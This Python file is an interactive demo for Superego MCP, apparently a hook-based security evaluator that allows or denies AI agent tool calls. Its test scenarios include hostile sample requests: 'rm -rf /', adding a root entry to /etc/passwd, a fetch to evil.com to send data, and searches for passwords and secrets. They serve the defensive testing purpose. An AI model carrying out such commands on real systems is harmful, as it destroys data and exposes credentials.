#!/usr/bin/env python3
"""
Interactive Hook Demo for Superego MCP.

A menu-driven demo with real-time feedback for testing security scenarios
using the hook-based test harness.
"""

import sys
import json
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# Add the project source directory to the Python path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from base_demo import BaseDemo
from demo_utils import (
    Colors,
    create_demo_header,
    format_timestamp,
    parse_common_args,
    format_tool_request,
    format_decision,
    format_hook_output,
    prompt_yes_no
)
from superego_mcp.domain.models import ToolAction


class InteractiveHookDemo(BaseDemo):
    """Interactive demo with menu-driven scenario testing and real-time feedback."""
    
    def __init__(self, **kwargs):
        """Initialize the interactive hook demo."""
        super().__init__(demo_name="interactive_hook", **kwargs)
        
        # Demo state
        self.current_context = {
            "user": "demo_user",
            "session_start": format_timestamp(),
            "requests_made": 0,
            "last_decision": None
        }
        
        # Predefined scenario templates
        self.templates = self._create_scenario_templates()
    
    def _create_scenario_templates(self) -> Dict[str, List[Dict[str, Any]]]:
        """Create categorized scenario templates."""
        return {
            "file_operations": [
                {
                    "name": "Read file",
                    "tool": "Read",
                    "params_template": {"file_path": "<path>"},
                    "examples": ["./README.md", "/etc/hosts", "~/.ssh/config"]
                },
                {
                    "name": "Write file",
                    "tool": "Write",
                    "params_template": {"file_path": "<path>", "content": "<content>"},
                    "examples": [
                        {"file_path": "./output.txt", "content": "Test data"},
                        {"file_path": "/etc/passwd", "content": "malicious:x:0:0::/:"}
                    ]
                },
                {
                    "name": "Edit file",
                    "tool": "Edit",
                    "params_template": {
                        "file_path": "<path>",
                        "old_string": "<old>",
                        "new_string": "<new>"
                    },
                    "examples": [
                        {
                            "file_path": "./config.json",
                            "old_string": '"debug": false',
                            "new_string": '"debug": true'
                        }
                    ]
                }
            ],
            "shell_commands": [
                {
                    "name": "Run command",
                    "tool": "Bash",
                    "params_template": {"command": "<cmd>", "description": "<desc>"},
                    "examples": [
                        {"command": "ls -la", "description": "List files"},
                        {"command": "rm -rf /", "description": "Delete everything"},
                        {"command": "git commit -m 'Update'", "description": "Commit changes"}
                    ]
                }
            ],
            "network_operations": [
                {
                    "name": "Fetch URL",
                    "tool": "WebFetch",
                    "params_template": {"url": "<url>", "prompt": "<prompt>"},
                    "examples": [
                        {"url": "https://api.github.com/user", "prompt": "Get user info"},
                        {"url": "http://evil.com/steal", "prompt": "Send data"}
                    ]
                },
                {
                    "name": "Web search",
                    "tool": "WebSearch",
                    "params_template": {"query": "<query>"},
                    "examples": [
                        {"query": "Python best practices"},
                        {"query": "how to hack systems"}
                    ]
                }
            ],
            "search_operations": [
                {
                    "name": "Search files",
                    "tool": "Grep",
                    "params_template": {
                        "pattern": "<pattern>",
                        "path": "<path>",
                        "output_mode": "content"
                    },
                    "examples": [
                        {"pattern": "TODO", "path": "./src", "output_mode": "files_with_matches"},
                        {"pattern": "password|secret", "path": ".", "output_mode": "content"}
                    ]
                },
                {
                    "name": "Find files",
                    "tool": "Glob",
                    "params_template": {"pattern": "<pattern>", "path": "<path>"},
                    "examples": [
                        {"pattern": "*.py", "path": "./src"},
                        {"pattern": "**/password*", "path": "/"}
                    ]
                }
            ]
        }
    
    def show_main_menu(self):
        """Display the main menu."""
        print(f"\n{Colors.BOLD}Main Menu{Colors.RESET}")
        print("1. Quick test (predefined scenarios)")
        print("2. Build custom request")
        print("3. Use scenario template")
        print("4. Replay last request")
        print("5. View session statistics")
        print("6. Export session data")
        print("7. Help")
        print("8. Exit")
    
    def run_quick_test(self):
        """Run a quick test with predefined scenarios."""
        scenarios = [
            ("Safe read", "Read", {"file_path": "./README.md"}),
            ("Dangerous command", "Bash", {"command": "rm -rf /", "description": "Delete all"}),
            ("API request", "WebFetch", {"url": "https://httpbin.org/ip", "prompt": "Get IP"}),
            ("Secret search", "Grep", {"pattern": "password", "path": ".", "output_mode": "content"})
        ]
        
        print(f"\n{Colors.BOLD}Quick Test Scenarios{Colors.RESET}")
        for i, (name, _, _) in enumerate(scenarios, 1):
            print(f"{i}. {name}")
        print(f"{len(scenarios) + 1}. Run all")
        print("0. Back")
        
        choice = input("\nSelect scenario: ").strip()
        
        try:
            if choice == "0":
                return
            elif choice == str(len(scenarios) + 1):
                # Run all
                for name, tool, params in scenarios:
                    self._run_with_feedback(tool, params, name)
            else:
                idx = int(choice) - 1
                if 0 <= idx < len(scenarios):
                    name, tool, params = scenarios[idx]
                    self._run_with_feedback(tool, params, name)
        except (ValueError, IndexError):
            print(f"{Colors.RED}Invalid selection{Colors.RESET}")
    
    def build_custom_request(self):
        """Build a custom tool request interactively."""
        print(f"\n{Colors.BOLD}Build Custom Request{Colors.RESET}")
        
        # Get tool name
        print("\nAvailable tools: Read, Write, Edit, Bash, WebFetch, WebSearch, Grep, Glob, LS")
        tool_name = input("Tool name: ").strip()
        
        if not tool_name:
            print(f"{Colors.YELLOW}Tool name required{Colors.RESET}")
            return
        
        # Get parameters
        print("\nEnter parameters (JSON format or key=value pairs)")
        print("Example JSON: {\"file_path\": \"/tmp/test.txt\"}")
        print("Example pairs: file_path=/tmp/test.txt")
        
        param_input = input("Parameters: ").strip()
        
        try:
            # Try JSON first
            if param_input.startswith("{"):
                parameters = json.loads(param_input)
            else:
                # Parse key=value pairs
                parameters = {}
                if param_input:
                    for pair in param_input.split():
                        if "=" in pair:
                            key, value = pair.split("=", 1)
                            parameters[key] = value
        except (json.JSONDecodeError, ValueError) as e:
            print(f"{Colors.RED}Invalid parameters: {e}{Colors.RESET}")
            return
        
        # Get description
        description = input("Description (optional): ").strip()
        
        # Run with feedback
        self._run_with_feedback(tool_name, parameters, description or f"Custom {tool_name}")
    
    def use_scenario_template(self):
        """Use a predefined scenario template."""
        print(f"\n{Colors.BOLD}Scenario Templates{Colors.RESET}")
        
        # Show categories
        categories = list(self.templates.keys())
        for i, cat in enumerate(categories, 1):
            print(f"{i}. {cat.replace('_', ' ').title()}")
        
        cat_choice = input("\nSelect category: ").strip()
        
        try:
            cat_idx = int(cat_choice) - 1
            if 0 <= cat_idx < len(categories):
                category = categories[cat_idx]
                self._show_category_templates(category)
        except (ValueError, IndexError):
            print(f"{Colors.RED}Invalid selection{Colors.RESET}")
    
    def _show_category_templates(self, category: str):
        """Show templates for a specific category."""
        templates = self.templates[category]
        
        print(f"\n{Colors.BOLD}{category.replace('_', ' ').title()} Templates{Colors.RESET}")
        for i, template in enumerate(templates, 1):
            print(f"{i}. {template['name']}")
        
        tmpl_choice = input("\nSelect template: ").strip()
        
        try:
            tmpl_idx = int(tmpl_choice) - 1
            if 0 <= tmpl_idx < len(templates):
                template = templates[tmpl_idx]
                self._use_template(template)
        except (ValueError, IndexError):
            print(f"{Colors.RED}Invalid selection{Colors.RESET}")
    
    def _use_template(self, template: Dict[str, Any]):
        """Use a specific template to create a request."""
        print(f"\n{Colors.BOLD}Using template: {template['name']}{Colors.RESET}")
        
        # Show examples if available
        if "examples" in template:
            print("\nExamples:")
            for i, example in enumerate(template["examples"], 1):
                if isinstance(example, dict):
                    print(f"{i}. {json.dumps(example, indent=2)}")
                else:
                    print(f"{i}. {example}")
            
            use_example = input("\nUse example (number) or create custom (c): ").strip()
            
            if use_example.lower() != 'c':
                try:
                    ex_idx = int(use_example) - 1
                    if 0 <= ex_idx < len(template["examples"]):
                        example = template["examples"][ex_idx]
                        if isinstance(example, dict):
                            params = example
                        else:
                            # Simple example, use template
                            params = template["params_template"].copy()
                            params[list(params.keys())[0]] = example
                        
                        self._run_with_feedback(template["tool"], params, template["name"])
                        return
                except (ValueError, IndexError):
                    pass
        
        # Create custom from template
        params = {}
        for key, placeholder in template["params_template"].items():
            value = input(f"{key} {placeholder}: ").strip()
            if value:
                params[key] = value
        
        if params:
            self._run_with_feedback(template["tool"], params, template["name"])
    
    def replay_last_request(self):
        """Replay the last request made."""
        if not self.results:
            print(f"{Colors.YELLOW}No previous requests to replay{Colors.RESET}")
            return
        
        last_result = self.results[-1]
        print(f"\n{Colors.BOLD}Replaying Last Request{Colors.RESET}")
        print(f"Tool: {last_result['tool_name']}")
        print(f"Parameters: {json.dumps(last_result['parameters'], indent=2)}")
        
        if prompt_yes_no("\nReplay this request?", default=True):
            self._run_with_feedback(
                last_result["tool_name"],
                last_result["parameters"],
                f"Replay: {last_result.get('description', 'Unknown')}"
            )
    
    def view_session_statistics(self):
        """Display session statistics."""
        print(f"\n{Colors.BOLD}Session Statistics{Colors.RESET}")
        print(f"Session ID: {self.session_id}")
        print(f"Started: {self.current_context['session_start']}")
        print(f"Total requests: {len(self.results)}")
        
        if self.results:
            # Count by decision
            decisions = {"allow": 0, "deny": 0, "sample": 0}
            tools_used = {}
            
            for result in self.results:
                if "decision" in result:
                    action = result["decision"]["action"]
                    decisions[action] = decisions.get(action, 0) + 1
                
                tool = result["tool_name"]
                tools_used[tool] = tools_used.get(tool, 0) + 1
            
            print(f"\n{Colors.BOLD}Decisions:{Colors.RESET}")
            print(f"  Allowed: {Colors.GREEN}{decisions['allow']}{Colors.RESET}")
            print(f"  Denied: {Colors.RED}{decisions['deny']}{Colors.RESET}")
            print(f"  Sampled: {Colors.YELLOW}{decisions.get('sample', 0)}{Colors.RESET}")
            
            print(f"\n{Colors.BOLD}Tools Used:{Colors.RESET}")
            for tool, count in sorted(tools_used.items(), key=lambda x: x[1], reverse=True):
                print(f"  {tool}: {count}")
    
    def export_session_data(self):
        """Export session data to file."""
        print(f"\n{Colors.BOLD}Export Session Data{Colors.RESET}")
        
        format_choice = input("Export format (json/txt) [json]: ").strip().lower() or "json"
        
        if format_choice == "json":
            self.save_results()
            print(f"{Colors.GREEN}Session data exported as JSON{Colors.RESET}")
        elif format_choice == "txt":
            output_file = f"/tmp/{self.demo_name}_{self.session_id}_report.txt"
            self._export_as_text(output_file)
            print(f"{Colors.GREEN}Session data exported to: {output_file}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}Unknown format{Colors.RESET}")
    
    def _export_as_text(self, output_file: str):
        """Export session data as human-readable text."""
        with open(output_file, 'w') as f:
            f.write(f"Superego MCP Security Evaluation Report\n")
            f.write(f"{'=' * 50}\n")
            f.write(f"Session ID: {self.session_id}\n")
            f.write(f"Date: {format_timestamp()}\n")
            f.write(f"Total Requests: {len(self.results)}\n\n")
            
            for i, result in enumerate(self.results, 1):
                f.write(f"Request #{i}\n")
                f.write(f"-" * 30 + "\n")
                f.write(f"Tool: {result['tool_name']}\n")
                f.write(f"Description: {result.get('description', 'N/A')}\n")
                f.write(f"Parameters: {json.dumps(result['parameters'], indent=2)}\n")
                
                if "decision" in result:
                    decision = result["decision"]
                    f.write(f"Decision: {decision['action']}\n")
                    f.write(f"Reason: {decision.get('reason', 'N/A')}\n")
                    f.write(f"Confidence: {decision.get('confidence', 0):.1%}\n")
                
                f.write("\n")
    
    def show_help(self):
        """Display help information."""
        help_text = f"""
{Colors.BOLD}Interactive Hook Demo Help{Colors.RESET}

This demo provides an interactive interface for testing Superego MCP's
security evaluation capabilities using the hook-based test harness.

{Colors.BOLD}Features:{Colors.RESET}
- Quick test with predefined scenarios
- Build custom tool requests
- Use scenario templates for common patterns
- Real-time feedback with detailed analysis
- Session tracking and statistics
- Export results in multiple formats

{Colors.BOLD}Tool Categories:{Colors.RESET}
- File Operations: Read, Write, Edit
- Shell Commands: Bash
- Network: WebFetch, WebSearch
- Search: Grep, Glob
- System: LS

{Colors.BOLD}Tips:{Colors.RESET}
- Use templates for quick scenario creation
- Check session statistics to see patterns
- Export results for later analysis
- Replay requests to test consistency
"""
        print(help_text)
    
    def _run_with_feedback(self, tool_name: str, parameters: Dict[str, Any], description: str):
        """Run a request with real-time feedback."""
        print(f"\n{Colors.CYAN}{'=' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}Executing: {description}{Colors.RESET}")
        print(f"{Colors.CYAN}{'=' * 60}{Colors.RESET}")
        
        # Show request details
        print(f"\n{Colors.BOLD}Request:{Colors.RESET}")
        print(format_tool_request(tool_name, parameters))
        
        # Add slight delay for visual effect
        time.sleep(0.5)
        
        # Process request
        print(f"\n{Colors.BOLD}Processing...{Colors.RESET}")
        result = self.process_tool_request(tool_name, parameters, description)
        
        # Show decision
        if "decision" in result:
            print(f"\n{Colors.BOLD}Decision:{Colors.RESET}")
            print(format_decision(result["decision"]))
        
        # Show hook output
        if "hook_output" in result:
            print(f"\n{Colors.BOLD}Hook Output:{Colors.RESET}")
            print(format_hook_output(result["hook_output"]))
        
        # Update context
        self.current_context["requests_made"] += 1
        self.current_context["last_decision"] = result.get("decision", {}).get("action")
        
        # Pause for readability
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def run(self):
        """Main entry point for the interactive demo."""
        print(create_demo_header("Interactive Hook Demo"))
        print(f"\nMenu-driven scenario testing with real-time feedback")
        print(f"Session ID: {self.session_id}")
        print(f"Time: {format_timestamp()}\n")
        
        while True:
            self.show_main_menu()
            choice = input("\nChoice: ").strip()
            
            if choice == "1":
                self.run_quick_test()
            elif choice == "2":
                self.build_custom_request()
            elif choice == "3":
                self.use_scenario_template()
            elif choice == "4":
                self.replay_last_request()
            elif choice == "5":
                self.view_session_statistics()
            elif choice == "6":
                self.export_session_data()
            elif choice == "7":
                self.show_help()
            elif choice == "8":
                if prompt_yes_no("\nExit demo?", default=False):
                    break
            else:
                print(f"{Colors.YELLOW}Invalid choice{Colors.RESET}")
        
        # Show final summary
        if self.results:
            print(f"\n{Colors.BOLD}Session Complete{Colors.RESET}")
            self.view_session_statistics()


def main():
    """Main entry point."""
    args = parse_common_args("Interactive Hook Demo")
    
    try:
        demo = InteractiveHookDemo(
            log_level=args.log_level,
            rules_file=args.rules,
            session_id=args.session_id
        )
        
        demo.run()
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Demo interrupted{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}Error: {e}{Colors.RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()